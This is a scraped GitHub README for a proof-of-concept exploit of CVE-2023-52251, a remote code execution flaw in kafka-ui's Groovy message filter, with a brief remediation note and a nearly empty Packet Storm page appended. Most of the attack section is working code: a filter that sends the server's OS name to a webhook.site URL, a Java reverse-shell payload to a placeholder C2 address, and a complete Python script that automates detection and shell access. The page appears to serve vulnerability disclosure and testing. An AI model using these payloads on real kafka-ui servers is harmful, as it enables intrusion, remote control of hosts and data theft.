=== Content from github.com_e16a344b_20250114_195816.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBobTheShoplifter%2FCVE-2023-52251-POC)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FBobTheShoplifter%2FCVE-2023-52251-POC)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=BobTheShoplifter%2FCVE-2023-52251-POC)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[BobTheShoplifter](/BobTheShoplifter)
/
**[CVE-2023-52251-POC](/BobTheShoplifter/CVE-2023-52251-POC)**
Public

* [Notifications](/login?return_to=%2FBobTheShoplifter%2FCVE-2023-52251-POC) You must be signed in to change notification settings
* [Fork
  3](/login?return_to=%2FBobTheShoplifter%2FCVE-2023-52251-POC)
* [Star
   19](/login?return_to=%2FBobTheShoplifter%2FCVE-2023-52251-POC)

CVE-2023-52251 There is a Remote Code Execution vulnerability provectus/kafka-ui.

### License

[Apache-2.0 license](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/LICENSE)

[19
stars](/BobTheShoplifter/CVE-2023-52251-POC/stargazers) [3
forks](/BobTheShoplifter/CVE-2023-52251-POC/forks) [Branches](/BobTheShoplifter/CVE-2023-52251-POC/branches) [Tags](/BobTheShoplifter/CVE-2023-52251-POC/tags) [Activity](/BobTheShoplifter/CVE-2023-52251-POC/activity)
 [Star](/login?return_to=%2FBobTheShoplifter%2FCVE-2023-52251-POC)

 [Notifications](/login?return_to=%2FBobTheShoplifter%2FCVE-2023-52251-POC) You must be signed in to change notification settings

* [Code](/BobTheShoplifter/CVE-2023-52251-POC)
* [Issues
  0](/BobTheShoplifter/CVE-2023-52251-POC/issues)
* [Pull requests
  0](/BobTheShoplifter/CVE-2023-52251-POC/pulls)
* [Actions](/BobTheShoplifter/CVE-2023-52251-POC/actions)
* [Projects
  0](/BobTheShoplifter/CVE-2023-52251-POC/projects)
* [Security](/BobTheShoplifter/CVE-2023-52251-POC/security)
* [Insights](/BobTheShoplifter/CVE-2023-52251-POC/pulse)

Additional navigation options

* [Code](/BobTheShoplifter/CVE-2023-52251-POC)
* [Issues](/BobTheShoplifter/CVE-2023-52251-POC/issues)
* [Pull requests](/BobTheShoplifter/CVE-2023-52251-POC/pulls)
* [Actions](/BobTheShoplifter/CVE-2023-52251-POC/actions)
* [Projects](/BobTheShoplifter/CVE-2023-52251-POC/projects)
* [Security](/BobTheShoplifter/CVE-2023-52251-POC/security)
* [Insights](/BobTheShoplifter/CVE-2023-52251-POC/pulse)

# BobTheShoplifter/CVE-2023-52251-POC

    main[Branches](/BobTheShoplifter/CVE-2023-52251-POC/branches)[Tags](/BobTheShoplifter/CVE-2023-52251-POC/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[9 Commits](/BobTheShoplifter/CVE-2023-52251-POC/commits/main/) | | |
| [LICENSE](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/LICENSE "LICENSE") | | [LICENSE](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/LICENSE "LICENSE") |  |  |
| [README.md](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/README.md "README.md") | | [README.md](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/README.md "README.md") |  |  |
| [kafka4shell.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/kafka4shell.png "kafka4shell.png") | | [kafka4shell.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/kafka4shell.png "kafka4shell.png") |  |  |
| [poc.py](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/poc.py "poc.py") | | [poc.py](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/poc.py "poc.py") |  |  |
| [rce.js](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/rce.js "rce.js") | | [rce.js](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/rce.js "rce.js") |  |  |
| [rce2.js](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/rce2.js "rce2.js") | | [rce2.js](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/rce2.js "rce2.js") |  |  |
| [screenshot1.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot1.png "screenshot1.png") | | [screenshot1.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot1.png "screenshot1.png") |  |  |
| [screenshot2.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot2.png "screenshot2.png") | | [screenshot2.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot2.png "screenshot2.png") |  |  |
| [screenshot3.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot3.png "screenshot3.png") | | [screenshot3.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot3.png "screenshot3.png") |  |  |
| [screenshot4.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot4.png "screenshot4.png") | | [screenshot4.png](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot4.png "screenshot4.png") |  |  |
| View all files | | |

## Repository files navigation

* README
* Apache-2.0 license
# CVE-2023-52251-POC

There is a Remote Code Execution vulnerability [provectus/kafka-ui](https://github.com/provectus/kafka-ui). There is no patch as of writing this, but the vendor is notified by us and the team over at [VINCE](https://kb.cert.org/vince) without any response. Report was sent Sep 27, 2023 to provectus both via email and github security.

# Remediation

We suggest commenting out the entire groovy filter function/adding authentication as a minimum.

## Metadata

| Title | Value |
| --- | --- |
| CVSS String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H |
| CVE ID | CVE-2023-52251 |
| CVS Description | provectus kafka-ui 0.4.0-0.7.1 was discovered to contain a remote command execution (RCE) vulnerability via the q parameter at /api/clusters/local/topics/{topic}/messages |
| CVSS Score | 9.x |
| CWE | CWE-94: Improper Control of Generation of Code ('Code Injection') |
| Vendor | Provectus |
| Product | kafka-ui |
| Link | <https://github.com/provectus/kafka-ui> |
| Affected Versions | 0.4.0-0.7.1 |
| Patched Versions | None |
| Contributors | [Thingstad](https://github.com/thingstad), [BobTheShoplifter](https://github.com/BobTheShoplifter) |

### Details

Vulnerability Type: Remote Code Execution (RCE)

Affected Software: [Kafka-ui](https://github.com/provectus/kafka-ui)

Version: [0.4.0-0.7.1]

#### Vulnerability Description

There is no sanitization of the groovy script filter before it is executed. This allows an attacker to execute arbitrary code on the server.

#### Source Code Reference

In the function [groovyScriptFilter](https://github.com/provectus/kafka-ui/blob/master/kafka-ui-api/src/main/java/com/provectus/kafka/ui/emitter/MessageFilters.java#L41%3E) the "script" is not sanitized before being executed.

And is being evaled in the engine:

```
var result = compiledScript.eval(bindings);
```

<https://github.com/provectus/kafka-ui/blob/master/kafka-ui-api/src/main/java/com/provectus/kafka/ui/emitter/MessageFilters.java#58>

### PoC

*Complete instructions, including specific configuration details, to reproduce the vulnerability.*

Using the filter:

```
new URL("https://webhook.site/xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx/" + System.getProperty("os.name")).text
```

[![Filter screenshot](/BobTheShoplifter/CVE-2023-52251-POC/raw/main/screenshot1.png)](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot1.png)

Will send a request to the webhook with the OS name of the server.

[![Webhook screenshot](/BobTheShoplifter/CVE-2023-52251-POC/raw/main/screenshot2.png)](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot2.png)

Further expanding on this, we can use the following payload to get a reverse shell:

```
String host="xxx.xxx.xxx.xx";int port=8080;String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

The payload is generated easily on <https://www.revshells.com/>.

[![Reverse shell](/BobTheShoplifter/CVE-2023-52251-POC/raw/main/screenshot3.png)](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot3.png)

And a poc in python has also been created:

```
from time import sleep
import requests
import json
import urllib
import argparse

url = 'http://localhost:8080'
clusters = None
c2 = "xxx.xxx.xxx.xx"
port = "8080"
mode = "check"

def get_clusters():
    global clusters
    clusterfetch = requests.get(url + '/api/clusters')
    clusters = clusterfetch.json()

def get_topics(cluster):
    topicfetch = requests.get(
        url + f'/api/clusters/{cluster}/topics?showInternal=true&search=&orderBy=NAME&sortOrder=ASC')
    topics = topicfetch.json()['topics']
    return topics

def get_webhooks():
    webhookfetch = requests.post('https://webhook.site/token')
    webhook = 'https://webhook.site/' + webhookfetch.json()['uuid']+"/"
    print('URL Created: ' + webhook)
    token_id = webhookfetch.json()['uuid']
    headers = {"api-key": webhookfetch.json()['uuid']}
    return webhook, token_id, headers

def Exploit():
    try:
        get_clusters()

        cluster = clusters[0]['name']

        topics = get_topics(cluster)
        topic = topics[0]['name']

        webhook, token_id, headers = get_webhooks()

        checkpayload = 'new URL("'+webhook+'").text'

        rcepayload = 'String host="' + c2 + \
            '";int port='+port + \
            ';String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'

        payload = rcepayload if mode == "rce" else checkpayload

        r = requests.get(
            url + f'/api/clusters/local/topics/{topic}/messages?q={urllib.parse.quote(payload)}&filterQueryType=GROOVY_SCRIPT&attempt=2&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING', timeout=60)
        print(r.text)

        r = requests.get('https://webhook.site/token/' + token_id +
                         '/requests?sorting=newest', headers=headers)

        if r.json()['data'] == []:
            print("No rce found")
        else:
            for request in r.json()['data']:
                print(request)
                print("Rce found")

    except KeyboardInterrupt:
        print("KeyboardInterrupt")
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Kafka-ui4shell rce.')
    parser.add_argument('--mode', help='check, rce', required=False,
                        choices=['check', 'rce'], default="check")
    parser.add_argument(
        '--url', help='Target url. Example http://localhost:8080', required=True)
    parser.add_argument('--c2', help='C2 ip for RCE',
                        required=False),
    parser.add_argument('--c2port', help='File with urls', required=False)
    args = parser.parse_args()

    if args.mode == "rce":
        # Check if c2 and c2port are set
        if args.c2 and args.c2port:
            c2 = args.c2
            port = args.c2port
            mode = args.mode
            Exploit()
            exit()
        else:
            print("C2 and C2 port are required for RCE")
            exit()

    if args.url:
        url = args.url
        if args.mode:
            mode = args.mode
        if args.c2:
            c2 = args.c2
        if args.c2port:
            port = args.c2port
        Exploit()
        exit()

    else:
        parser.print_help()
```

### Impact

This vulnerability allows an attacker to execute arbitrary code on the server. This can be used to gain access to the server and further compromise the system. This vulnerability is exploitable by any user with access to the kafka-ui web interface.

At the time of writing, there are 1,000+ instances of kafka-ui exposed to the internet according to [Cencys](https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.html_title%3A+%22UI+for+Apache+Kafka%22). All of these instances could be vulnerable to this attack.

[![Cencys screenshot](/BobTheShoplifter/CVE-2023-52251-POC/raw/main/screenshot4.png)](/BobTheShoplifter/CVE-2023-52251-POC/blob/main/screenshot4.png)

This software is also likely to run on internal networks, where an attacker could gain access to the network and exploit this vulnerability.

### Contrubutors

Lars Thingstad - [@Thingstad](https://github.com/thingstad)
Daniel Christensen - [@BobTheShoplifter](https://github.com/BobTheShoplifter)

### References

* <https://cwe.mitre.org/data/definitions/94.html>

## About

CVE-2023-52251 There is a Remote Code Execution vulnerability provectus/kafka-ui.

### Topics

[poc](/topics/poc "Topic: poc")
[cve](/topics/cve "Topic: cve")
[kafka-ui](/topics/kafka-ui "Topic: kafka-ui")
[cve-2023-52251](/topics/cve-2023-52251 "Topic: cve-2023-52251")

### Resources

[Readme](#readme-ov-file)
### License

[Apache-2.0 license](#Apache-2.0-1-ov-file)

[Activity](/BobTheShoplifter/CVE-2023-52251-POC/activity)
### Stars

[**19**
stars](/BobTheShoplifter/CVE-2023-52251-POC/stargazers)
### Watchers

[**2**
watching](/BobTheShoplifter/CVE-2023-52251-POC/watchers)
### Forks

[**3**
forks](/BobTheShoplifter/CVE-2023-52251-POC/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FBobTheShoplifter%2FCVE-2023-52251-POC&report=BobTheShoplifter+%28user%29)

## [Releases](/BobTheShoplifter/CVE-2023-52251-POC/releases)

No releases published

## [Packages 0](/users/BobTheShoplifter/packages?repo_name=CVE-2023-52251-POC)

No packages published

## Languages

* [JavaScript
  54.5%](/BobTheShoplifter/CVE-2023-52251-POC/search?l=javascript)
* [Python
  45.5%](/BobTheShoplifter/CVE-2023-52251-POC/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from packetstormsecurity.com_b4ac6c4b_20250114_195815.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)


